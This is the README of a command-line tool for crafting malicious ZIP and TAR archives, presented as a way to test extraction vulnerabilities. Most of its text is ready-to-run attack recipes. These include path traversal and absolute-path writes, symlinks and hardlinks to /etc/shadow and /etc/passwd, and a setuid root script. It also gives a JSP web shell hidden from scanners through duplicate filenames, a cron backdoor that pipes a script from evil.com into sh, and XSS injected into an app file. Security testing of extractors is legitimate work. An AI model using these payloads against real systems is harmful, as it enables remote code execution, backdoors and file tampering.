# Archive Alchemist

A CLI tool for crafting malicious archives to test extraction vulnerabilities. Supports ZIP and TAR formats with path traversal, symlinks, permission abuse, polyglots, and more.

![](art.png)
<!-- ASCII art by jgs from https://ascii.co.uk/art/science -->

## Install

```bash
git clone https://github.com/avlidienbrunn/archivealchemist.git
cd archivealchemist
chmod +x archive-alchemist.py

# Optional: make it available globally
sudo ln -s $(pwd)/archive-alchemist.py /usr/local/bin/archive-alchemist
```

Requires **Python 3** (standard library only, no dependencies).

## Quick Start

```bash
# Create a zip with a path traversal payload
./archive-alchemist.py evil.zip add "../../../tmp/pwned.txt" --content "escaped!"

# Create a tar with a symlink to /etc/passwd
./archive-alchemist.py evil.tar add .bashrc --symlink "/etc/passwd"

# Inspect what's inside
./archive-alchemist.py evil.zip list

# Read a file without extracting
./archive-alchemist.py evil.zip read "../../../tmp/pwned.txt"

# Safely extract (path traversal and symlinks are neutralized)
./archive-alchemist.py evil.zip extract -o ./out

# Dangerously extract (preserves all attack patterns)
./archive-alchemist.py evil.zip extract -o ./out --vulnerable
```

## General Syntax

```
./archive-alchemist.py <archive> [options] <command> [command-options]
```

| Option | Description |
|--------|-------------|
| `-t <type>` | Force archive type: `zip`, `tar`, `tar.gz`, `tar.xz`, `tar.bz2` |
| `-v` | Verbose output |
| `-fo` / `--find-orphaned` | Deep-scan ZIP for orphaned entries not in central directory |

The archive type is **auto-detected** from magic bytes or file extension. Use `-t` only when you need to override (e.g. creating a new file with a non-standard extension).

## Commands

### `add` - Add entries to an archive

```bash
./archive-alchemist.py <archive> add <path> [options]
```

**Content source** (pick one):

| Option | What it does |
|--------|-------------|
| `--content "text"` | Inline text content |
| `--content-file local/file` | Read content from a local file |
| `--content-directory local/dir` | Add an entire directory recursively |
| `--symlink <target>` | Create a symbolic link |
| `--hardlink <target>` | Create a hard link (TAR only) |

**Attributes** (all optional):

| Option | What it does |
|--------|-------------|
| `--mode 0755` | File permissions (octal) |
| `--uid 0` | Owner user ID |
| `--gid 0` | Owner group ID |
| `--mtime 0` | Modification time (unix timestamp) |
| `--setuid` | Set the setuid bit |
| `--setgid` | Set the setgid bit |
| `--sticky` | Set the sticky bit |
| `--unicodepath name` | Set ZIP Unicode Path extra field (ZIP only) |

**Examples:**

```bash
# Regular file
./archive-alchemist.py archive.zip add hello.txt --content "Hello, world!"

# File from disk
./archive-alchemist.py archive.zip add config.json --content-file ./config.json

# Whole directory
./archive-alchemist.py archive.zip add assets/ --content-directory ./my-assets

# Symlink
./archive-alchemist.py archive.tar add link.txt --symlink "/etc/shadow"

# Path traversal
./archive-alchemist.py archive.zip add "../../../tmp/evil.txt" --content "escaped"

# Setuid root binary
./archive-alchemist.py archive.tar add exploit --content '#!/bin/sh\nid' --mode 0755 --setuid --uid 0

# Unicode path confusion (ZIP only)
./archive-alchemist.py archive.zip add safe.txt --content "data" --unicodepath "../evil.txt"
```

### `replace` - Replace existing entries

Removes the existing entry, then adds a new one in its place. Supports all the same content sources and attribute options as `add`.

```bash
# Replace with inline content
./archive-alchemist.py archive.zip replace config.json --content '{"version": 2}'

# Replace with content from a local file
./archive-alchemist.py archive.zip replace config.json --content-file ./local/config.json

# Replace with a whole directory
./archive-alchemist.py archive.zip replace assets/ --content-directory ./new-assets

# Replace a file with a symlink
./archive-alchemist.py archive.tar replace hello.txt --symlink "/etc/passwd"
```

### `append` - Append content to an existing file

```bash
./archive-alchemist.py <archive> append <path> --content "text"
./archive-alchemist.py <archive> append <path> --content-file local/file
```

```bash
# Inject JS into existing file
./archive-alchemist.py webapp.zip append assets/app.js --content "\nalert('xss');"
```

### `modify` - Change attributes of existing entries

```bash
./archive-alchemist.py <archive> modify <path> [attribute options]
```

Supports all attribute options from `add` (`--mode`, `--uid`, `--gid`, `--mtime`, `--setuid`, `--setgid`, `--sticky`, `--unicodepath`), plus:

| Option | What it does |
|--------|-------------|
| `--symlink <target>` | Convert entry to a symlink |
| `--hardlink <target>` | Convert entry to a hardlink |

```bash
# Make a file executable
./archive-alchemist.py archive.tar modify script.sh --mode 0755

# Add setuid bit
./archive-alchemist.py archive.tar modify bin/su --setuid --uid 0

# Convert regular file to symlink
./archive-alchemist.py archive.tar modify config.ini --symlink "/etc/app/config"
```

### `remove` / `rm` - Remove entries

```bash
./archive-alchemist.py <archive> remove <path> [-r 0|1]
```

Recursive by default (`-r 1`). Use `-r 0` to remove only the exact entry.

```bash
./archive-alchemist.py archive.zip remove old-dir/
./archive-alchemist.py archive.zip rm secret.txt
```

### `list` / `ls` - List archive contents

```bash
./archive-alchemist.py <archive> list [-l 0|1] [-ll]
```

| Option | Detail level |
|--------|-------------|
| `-l 0` | Filenames only |
| `-l 1` (default) | Permissions, size, timestamps |
| `-ll` | Full header dump (LFH, CDH, extra fields, etc.) |

```bash
./archive-alchemist.py archive.zip list
./archive-alchemist.py archive.zip list -l 0
./archive-alchemist.py suspicious.zip --find-orphaned list -ll
```

### `extract` - Extract archive contents

```bash
./archive-alchemist.py <archive> extract [-o dir] [--path entry] [--vulnerable]
```

| Option | What it does |
|--------|-------------|
| `-o <dir>` | Output directory (default: `.`) |
| `--path <entry>` | Extract only this entry |
| `--vulnerable` | Allow path traversal, absolute paths, real symlinks/hardlinks |
| `--normalize-permissions` | Don't preserve original file permissions |

**Safe mode** (default): strips `../`, blocks absolute paths, converts symlinks to regular files.
**Vulnerable mode**: preserves all attack patterns as-is. Use for testing extractors.

```bash
./archive-alchemist.py archive.zip extract -o ./output
./archive-alchemist.py evil.zip extract --vulnerable -o /tmp/test
./archive-alchemist.py archive.tar extract --path some/file.txt
```

### `read` / `cat` - Print file content to stdout

```bash
./archive-alchemist.py <archive> read <path> [-i index]
```

Use `-i` to select which entry when the archive has duplicate filenames.

```bash
./archive-alchemist.py archive.zip read README.txt
./archive-alchemist.py archive.zip cat config.json | jq .
./archive-alchemist.py archive.zip read duped.txt -i 1
```

### `polyglot` - Prepend data to an archive

Prepends content while adjusting internal offsets so the archive remains valid.

```bash
./archive-alchemist.py <archive> polyglot --content "data"
./archive-alchemist.py <archive> polyglot --content-file header.bin
```

```bash
# Make a file that's both a valid GIF and a valid ZIP
./archive-alchemist.py polyglot.gif add payload.txt --content "hello"
./archive-alchemist.py polyglot.gif polyglot --content "GIF89aI am a GIF"
```

## Supported Formats

| Format | Flag | Extensions | Symlinks | Hardlinks | Compression |
|--------|------|-----------|----------|-----------|-------------|
| ZIP | `zip` | `.zip` | Yes | No | Yes |
| TAR | `tar` | `.tar` | Yes | Yes | No |
| TAR.GZ | `tar.gz` | `.tar.gz` `.tgz` | Yes | Yes | gzip |
| TAR.XZ | `tar.xz` | `.tar.xz` `.txz` | Yes | Yes | xz |
| TAR.BZ2 | `tar.bz2` | `.tar.bz2` `.tbz2` | Yes | Yes | bzip2 |

Detection priority: `-t` flag > magic bytes > file extension > defaults to ZIP.

## Security Testing Recipes

### Zip Slip (path traversal)

```bash
./archive-alchemist.py zipslip.zip add "../../../tmp/evil.txt" --content "escaped!"
```

### Symlink to sensitive file

```bash
./archive-alchemist.py symlink.tar add .bashrc --symlink "/etc/shadow"
```

### Symlink + file collision

Write through a symlink by adding it first, then a regular file with the same name:

```bash
./archive-alchemist.py collision.tar add config --symlink "/tmp/target.txt"
./archive-alchemist.py collision.tar add config --content "written through symlink"
```

### Setuid binary

```bash
./archive-alchemist.py setuid.tar add exploit --content '#!/bin/sh\nid' --mode 0755 --setuid --uid 0
```

### Unicode path confusion (ZIP)

The local file header says `safe.txt`, but the Unicode Path extra field says `../evil.txt`:

```bash
./archive-alchemist.py confused.zip add safe.txt --content "payload" --unicodepath "../evil.txt"
```

### Polyglot file

```bash
./archive-alchemist.py polyglot.gif add payload.txt --content "data"
./archive-alchemist.py polyglot.gif polyglot --content "GIF89a"
```

## Advanced Techniques

### Duplicate Filenames

Add the same filename multiple times. Some extractors keep the first entry, others the last — use this to bypass security scanners that only inspect one.

```bash
# Add a clean file (scanner sees this)
./archive-alchemist.py dupe.zip add cmd.jsp --content "<!-- clean -->"

# Add the real payload with the same name (extractor may prefer this one)
./archive-alchemist.py dupe.zip add cmd.jsp --content "<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>"

# Read a specific duplicate by index
./archive-alchemist.py dupe.zip read cmd.jsp -i 0   # first entry
./archive-alchemist.py dupe.zip read cmd.jsp -i 1   # second entry

# Inspect both
./archive-alchemist.py dupe.zip list -ll
```

### Orphaned ZIP Entries (Hidden Payloads)

ZIP files have two layers: Local File Headers (LFH) scattered through the file, and a Central Directory (CD) at the end that indexes them. Most tools only read the CD. You can hide entries that exist as LFHs but aren't referenced in the CD — invisible to standard tools but some extractors still process them.

```bash
# List only what the Central Directory knows about
./archive-alchemist.py suspicious.zip list

# Deep-scan for orphaned LFHs not in the Central Directory
./archive-alchemist.py suspicious.zip --find-orphaned list

# Full header dump showing orphaned entries
./archive-alchemist.py suspicious.zip --find-orphaned list -ll
```

### Absolute Path Write

Distinct from `../` traversal — write directly to an absolute path on the filesystem:

```bash
# Write a cron job
./archive-alchemist.py abs.tar add "/etc/cron.d/backdoor" --content "* * * * * root curl http://evil.com/shell.sh | sh"

# Write to a predictable path
./archive-alchemist.py abs.zip add "/tmp/payload.so" --content-file ./payload.so

# Test extraction (safe mode blocks this; vulnerable mode allows it)
./archive-alchemist.py abs.zip extract --vulnerable -o /tmp/test
```

### Hardlink Attacks (TAR only)

TAR hardlinks can reference paths outside the archive. On vulnerable extraction, `os.link()` is called on whatever target you specify.

```bash
# Hardlink to a file outside the archive
./archive-alchemist.py hard.tar add link.txt --hardlink "/etc/passwd"

# Chain: symlink creates the reference, hardlink exploits it
./archive-alchemist.py chain.tar add step1 --symlink "/etc/shadow"
./archive-alchemist.py chain.tar add step2 --hardlink step1
```

### Forged Mode Bits

Mode bits and actual entry type are stored independently. Set symlink mode (`0120000`) on a regular file to confuse extractors that trust mode bits for type detection:

```bash
# Regular file content, but mode says "I'm a symlink"
./archive-alchemist.py forged.zip add decoy.txt --content "real content" --mode 0120777

# Directory mode on a file
./archive-alchemist.py forged.zip add notadir --content "file data" --mode 040755

# Inspect the mismatch
./archive-alchemist.py forged.zip list
```

### Timestamp Manipulation

Set modification times to hide files from forensic timelines or crash parsers with edge values:

```bash
# Backdate to epoch (1970-01-01) — may break ZIP's DOS date range (1980-2107)
./archive-alchemist.py ts.tar add old.txt --content "ancient" --mtime 0

# Set to far future
./archive-alchemist.py ts.tar add future.txt --content "not yet" --mtime 4102444800

# Match timestamps of legitimate files to blend in
./archive-alchemist.py ts.zip add backdoor.jsp --content "..." --mtime 1609459200
```

### Smuggling Symlinks via `--content-directory`

When using `--content-directory`, symlinks in the source directory are preserved as symlinks in the archive — they are **not** dereferenced. Use this to smuggle symlinks through a directory-based workflow:

```bash
# Create a local directory with a symlink
mkdir -p smuggle/app
echo "legit" > smuggle/app/config.json
ln -s /etc/passwd smuggle/app/users.txt

# Add the directory — symlink is preserved in the archive
./archive-alchemist.py smuggled.zip add "" --content-directory smuggle/

# Verify
./archive-alchemist.py smuggled.zip list
```

### CDH vs LFH Mismatch (ZIP)

ZIP stores file metadata in two places: the Local File Header (per-file, scattered) and the Central Directory Header (index at the end). When these disagree, extractors behave inconsistently. Use `list -ll` to inspect both:

```bash
# Create a file, then use modify + unicodepath to create a mismatch
./archive-alchemist.py mismatch.zip add safe.txt --content "payload" --unicodepath "../evil.txt"

# Inspect — LFH says "safe.txt", Unicode Path says "../evil.txt"
./archive-alchemist.py mismatch.zip list -ll
```

Some extractors trust the LFH filename, others prefer the Unicode Path extra field, others use the CDH. Test all combinations against your target.

### Compressed TAR Limitations

You cannot append to compressed archives (`.tar.gz`, `.tar.xz`, `.tar.bz2`). The tool silently rewrites the entire archive when you `add`, `replace`, `modify`, or `remove` entries. This works correctly but is slower on large archives and worth knowing when iterating.

```bash
# This works but rewrites the full archive each time
./archive-alchemist.py big.tar.gz add a.txt --content "one"
./archive-alchemist.py big.tar.gz add b.txt --content "two"   # full rewrite
./archive-alchemist.py big.tar.gz add c.txt --content "three" # full rewrite again

# Faster: build as .tar first, then compress
./archive-alchemist.py big.tar add a.txt --content "one"
./archive-alchemist.py big.tar add b.txt --content "two"
./archive-alchemist.py big.tar add c.txt --content "three"
gzip big.tar
```

## Workflow Tips

### Iterative testing with a working directory

The fastest way to iterate on payloads:

```bash
# 1. Extract the original archive
./archive-alchemist.py target.zip extract -o workdir/

# 2. Edit files in workdir/ as needed

# 3. Rebuild the archive from the directory
./archive-alchemist.py poc.zip replace "" --content-directory workdir/

# 4. Test poc.zip against target, then repeat from step 2
```

### Blind-detect symlink support

If the target uses `app/config.json`:

```bash
./archive-alchemist.py target.zip extract -o workdir/
cp workdir/app/config.json workdir/app/config2.json
./archive-alchemist.py poc.zip add "" --content-directory workdir/
./archive-alchemist.py poc.zip replace "app/config.json" --symlink config2.json
# If poc.zip still works normally on the target -> symlinks are followed
```

### Blind-detect path traversal

```bash
./archive-alchemist.py target.zip extract -o workdir/
mkdir -p workdir/app/sub
cp workdir/app/config.json workdir/app/sub/config.json
./archive-alchemist.py poc.zip add "" --content-directory workdir/
./archive-alchemist.py poc.zip add "app/sub/../config.json" --content-file workdir/app/sub/config.json
# If poc.zip still works normally on the target -> path traversal is possible
```

## Full Documentation

See [docs/index.md](docs/index.md) for detailed per-command documentation.
